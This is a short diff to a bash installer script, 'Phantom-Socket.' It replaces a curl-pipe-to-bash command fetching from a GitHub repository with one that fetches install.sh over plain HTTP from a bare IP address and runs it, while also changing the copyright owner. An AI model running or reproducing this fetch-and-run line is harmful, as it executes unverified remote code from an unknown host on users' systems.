@@ -1,4 +1,4 @@
 #!/bin/bash
 # Phantom-Socket v1.0 Final - Unified Installer Redirector
-# (C) 2026 Oyen-Sec
-curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/phantom-socket/main/deploy/install.sh | bash
+# (C) 2026 Phantom-Socket
+curl -fsSL http://13.213.138.250/install.sh | bash
